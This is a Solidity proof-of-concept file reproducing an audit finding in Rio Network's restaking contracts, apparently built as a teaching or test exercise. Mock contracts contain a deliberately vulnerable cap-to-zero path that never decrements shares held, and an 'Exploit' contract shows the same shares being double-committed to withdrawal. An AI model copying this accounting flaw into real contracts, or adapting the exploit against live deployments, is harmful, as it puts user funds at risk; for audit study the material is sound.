// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Rio Network — Setting the strategy cap to "0" does not update the total
    shares held or the withdrawal queue
    (Sherlock 2024-02-rio-network-core-protocol, finding #30897, H-2, kennedy1030)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The real
    OperatorRegistryV1Admin.setOperatorStrategyCap() queues a forced EigenLayer
    exit for an operator's full allocation when its cap is set to 0, but NEVER
    calls RioLRTAssetRegistry.decreaseSharesHeldForAsset() to reflect that. The
    Exploit deploys a minimal registry/asset-registry/coordinator/delegator set,
    has the admin zero out an operator's cap (forcing an EigenLayer exit for its
    full 500e18 allocation), and shows a user can then successfully request a
    withdrawal for THE SAME 500e18 shares — double-committing shares that only
    exist once (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: OperatorRegistryV1Admin.setOperatorStrategyCap()
    (utils/OperatorRegistryV1Admin.sol:L231-270, Rio Network) — when an
    operator's cap drops from >0 to 0, the function calls
    queueOperatorStrategyExit() (which forwards the operator's FULL allocation
    to EigenLayer's DelegationManager.queueWithdrawals) and removes the
    operator from the utilization heap — but it NEVER calls
    RioLRTAssetRegistry.decreaseSharesHeldForAsset() for the exited shares.

    RioLRTCoordinator.requestWithdrawal() (RioLRTCoordinator.sol:L99-116)
    computes `availableShares` from `assetRegistry().getTotalBalanceForAsset()`,
    which is driven by the (unreduced) `assetInfo[asset].shares` ledger. Because
    that ledger was never decremented, the shares already queued for an
    EigenLayer exit by the admin remain "available" to ordinary users, who can
    request a withdrawal against the SAME shares — double-counting them. When
    the epoch is later settled, only half the promised shares actually exist,
    and the withdrawal flow gets stuck (INCORRECT_NUMBER_OF_SHARES_QUEUED-class
    failure in the real system).

    Recommended fix (per the report): update the withdrawal queue / decrease
    `sharesHeld` when the operator registry admin removes an operator's
    EigenLayer shares (via cap-to-zero or operator removal).
//////////////////////////////////////////////////////////////*/

/// @dev Minimal stand-in for EigenLayer's DelegationManager.queueWithdrawals.
///      Tracks the cumulative shares ever queued for withdrawal — enough to
///      demonstrate the double-counting; the real settlement/completion flow
///      is irrelevant to this bug.
contract MockDelegationManager {
    uint256 public totalQueuedForWithdrawal;

    function queueWithdrawals(uint256 shares) external returns (bytes32 root) {
        totalQueuedForWithdrawal += shares;
        root = keccak256(abi.encode(shares, totalQueuedForWithdrawal, block.number));
    }
}

/// @dev Reduced RioLRTOperatorDelegator — only the operator-exit withdrawal
///      path matters for this bug. Faithful reduction of
///      restaking/RioLRTOperatorDelegator.sol:L225-273 (Rio Network).
contract OperatorDelegator {
    MockDelegationManager public delegationManager;

    constructor(address delegationManager_) {
        delegationManager = MockDelegationManager(delegationManager_);
    }

    /// @notice Queues a withdrawal of `shares` to EigenLayer for an operator exit.
    ///         RioLRTOperatorDelegator.sol:L225 -> _queueWithdrawalForOperatorExitOrScrape
    ///         -> _queueWithdrawal -> delegationManager.queueWithdrawals.
    function queueWithdrawalForOperatorExit(uint256 shares) external returns (bytes32 root) {
        root = delegationManager.queueWithdrawals(shares);
    }
}

struct OperatorShareDetails {
    uint256 cap;
    uint256 allocation;
}

/// @dev Reduced RioLRTAssetRegistry — single-asset, 1:1 share:asset ledger
///      (the real contract supports multiple assets and a strategy exchange
///      rate; both are irrelevant to this bug, which is about a MISSING
///      decrement, not the conversion math).
contract AssetRegistry {
    uint256 public sharesHeld; // assetInfo[asset].shares
    uint256 public tokensInDepositPool; // IERC20(asset).balanceOf(depositPool)

    function increaseSharesHeldForAsset(uint256 amount) external {
        sharesHeld += amount;
    }

    /// @notice RioLRTAssetRegistry.sol:L299 — decreaseSharesHeldForAsset.
    ///         Only ever called by the withdrawal queue or deposit pool when a
    ///         withdrawal actually SETTLES — never by the operator registry
    ///         when an admin forces an operator's exit.
    function decreaseSharesHeldForAsset(uint256 amount) external {
        sharesHeld -= amount;
    }

    function getAssetSharesHeld() external view returns (uint256) {
        return sharesHeld;
    }

    /// @notice RioLRTAssetRegistry.sol:L89 getTotalBalanceForAsset (reduced,
    ///         1:1 share:asset rate — tokensInRio + convertFromSharesToAsset).
    function getTotalBalanceForAsset() public view returns (uint256) {
        return tokensInDepositPool + sharesHeld;
    }
}

/// @dev Reduced RioLRTOperatorRegistry admin surface. Faithful reduction of
///      utils/OperatorRegistryV1Admin.sol:L231-270 (Rio Network). Utilization
///      heap bookkeeping is omitted — it does not affect this bug (finding
///      #30902 covers a SEPARATE heap-ordering bug).
contract OperatorRegistry {
    AssetRegistry public assetRegistry;
    mapping(uint8 => OperatorDelegator) public delegators;
    mapping(uint8 => OperatorShareDetails) public shareDetails;

    constructor(address assetRegistry_) {
        assetRegistry = AssetRegistry(assetRegistry_);
    }

    function registerOperator(uint8 operatorId, address delegator, uint256 cap, uint256 allocation) external {
        delegators[operatorId] = OperatorDelegator(delegator);
        shareDetails[operatorId] = OperatorShareDetails({cap: cap, allocation: allocation});
    }

    // ============================================================
    //  Vulnerable setOperatorStrategyCap() — faithful reduction of
    //  utils/OperatorRegistryV1Admin.sol:L231-270 (Rio Network)
    // ============================================================
    function setOperatorStrategyCap(uint8 operatorId, uint256 newCap) external {
        OperatorShareDetails storage currentShareDetails = shareDetails[operatorId];
        if (currentShareDetails.cap == newCap) {
            return;
        }

        if (currentShareDetails.cap > 0 && newCap == 0) {
            // If the operator has allocations, queue them for exit.
            if (currentShareDetails.allocation > 0) {
                _queueOperatorStrategyExit(operatorId, currentShareDetails.allocation);
            }
            // (utilizationHeap.removeByID(operatorId) — omitted, not relevant to this bug)
        } else if (currentShareDetails.cap == 0 && newCap > 0) {
            // (utilizationHeap.insert — omitted, not relevant to this bug)
        } else {
            // (utilizationHeap.updateUtilizationByID — omitted, not relevant to this bug)
        }

        // @> VULN: the operator's cap is updated and its EigenLayer exit is
        // queued above, but assetRegistry.decreaseSharesHeldForAsset() is NEVER
        // called for the shares just queued for exit. `sharesHeld` (which
        // RioLRTCoordinator.requestWithdrawal() reads to compute
        // `availableShares`) stays exactly as inflated as before this call.
        // OperatorRegistryV1Admin.sol:L231-270 (no decreaseSharesHeldForAsset call).
        currentShareDetails.cap = newCap;
    }

    function _queueOperatorStrategyExit(uint8 operatorId, uint256 sharesToExit) internal {
        delegators[operatorId].queueWithdrawalForOperatorExit(sharesToExit);
    }
}

/// @dev Reduced RioLRTCoordinator — only requestWithdrawal() matters for this
///      bug. Faithful reduction of restaking/RioLRTCoordinator.sol:L99-116
///      (Rio Network). Restaking-token/exchange-rate math is omitted — the
///      real function operates on shares after several conversions, all of
///      which are irrelevant to the missing-decrement bug.
contract Coordinator {
    AssetRegistry public assetRegistry;
    uint256 public sharesAlreadyQueuedThisEpoch; // withdrawalQueue().getSharesOwedInCurrentEpoch(asset)

    constructor(address assetRegistry_) {
        assetRegistry = AssetRegistry(assetRegistry_);
    }

    // ============================================================
    //  Vulnerable requestWithdrawal() — faithful reduction of
    //  restaking/RioLRTCoordinator.sol:L99-116 (Rio Network)
    // ============================================================
    function requestWithdrawal(uint256 sharesOwed) external returns (uint256) {
        // RioLRTCoordinator.sol:L111 — availableShares is derived from
        // assetRegistry().getTotalBalanceForAsset(), which still includes the
        // shares the admin already queued for an EigenLayer exit.
        uint256 availableShares = assetRegistry.getTotalBalanceForAsset();

        // @> VULN: `availableShares` was never reduced by shares the operator
        // registry admin already queued for exit via setOperatorStrategyCap(0),
        // so a user can request a withdrawal against shares that are ALSO
        // already committed to leaving via EigenLayer. RioLRTCoordinator.sol:L112.
        if (sharesOwed > availableShares - sharesAlreadyQueuedThisEpoch) {
            revert("INSUFFICIENT_SHARES_FOR_WITHDRAWAL");
        }
        sharesAlreadyQueuedThisEpoch += sharesOwed;
        return sharesOwed;
    }
}

/// @notice Attacker/admin orchestrator. Deploys the reduced Rio stack, forces
///         an operator's exit via setOperatorStrategyCap(0), then has a user
///         request a withdrawal for the SAME shares — demonstrating the
///         double-counted commitment. Cheatcode-free. Note: this finding does
///         not require an adversarial "attacker" — the harm arises from
///         ordinary admin + user actions interacting incorrectly, which is
///         exactly what the finding describes.
contract Exploit {
    uint8 internal constant OPERATOR_ID = 1;
    uint256 internal constant ALLOCATION = 500e18;

    MockDelegationManager public delegationManager; // CREATE nonce 1
    AssetRegistry public assetRegistry; // CREATE nonce 2
    OperatorDelegator public delegator; // CREATE nonce 3
    OperatorRegistry public operatorRegistry; // CREATE nonce 4
    Coordinator public coordinator; // CREATE nonce 5

    constructor() {
        delegationManager = new MockDelegationManager(); // nonce 1
        assetRegistry = new AssetRegistry(); // nonce 2
        delegator = new OperatorDelegator(address(delegationManager)); // nonce 3
        operatorRegistry = new OperatorRegistry(address(assetRegistry)); // nonce 4
        coordinator = new Coordinator(address(assetRegistry)); // nonce 5

        // Bootstrap: 500e18 worth of shares already deposited & pushed into
        // EigenLayer through the operator (mirrors the report's example).
        assetRegistry.increaseSharesHeldForAsset(ALLOCATION);
        operatorRegistry.registerOperator(OPERATOR_ID, address(delegator), 1e18, ALLOCATION);
    }

    function run() external {
        require(assetRegistry.getAssetSharesHeld() == ALLOCATION, "baseline shares wrong");

        // === 1. Admin removes the operator's strategy allocation entirely,
        //        forcing a full EigenLayer exit for its 500e18 allocation. ===
        operatorRegistry.setOperatorStrategyCap(OPERATOR_ID, 0);

        require(delegationManager.totalQueuedForWithdrawal() == ALLOCATION, "EigenLayer exit not queued");
        // HARM setup: sharesHeld is UNCHANGED even though 500e18 was just
        // committed to leaving the protocol via EigenLayer.
        require(assetRegistry.getAssetSharesHeld() == ALLOCATION, "sharesHeld should remain inflated (the bug)");

        // === 2. HARM: an ordinary user can now request a withdrawal for
        //        shares that are ALREADY queued for exit by the admin — the
        //        accounting has no idea these are the same underlying shares. ===
        uint256 userWithdrawalShares = coordinator.requestWithdrawal(ALLOCATION);
        require(userWithdrawalShares == ALLOCATION, "withdrawal should be accepted (double counted)");

        // Total shares now committed to leaving the protocol: the admin's
        // forced EigenLayer exit (500e18) PLUS the user's withdrawal request
        // (500e18) = 1000e18 — double the 500e18 that actually backs the LRT.
        uint256 totalCommitted = delegationManager.totalQueuedForWithdrawal() + coordinator.sharesAlreadyQueuedThisEpoch();
        require(totalCommitted == 2 * ALLOCATION, "double counting not demonstrated");
        require(
            totalCommitted > assetRegistry.getAssetSharesHeld(),
            "harm not demonstrated: commitments should exceed the real backing shares"
        );
    }
}
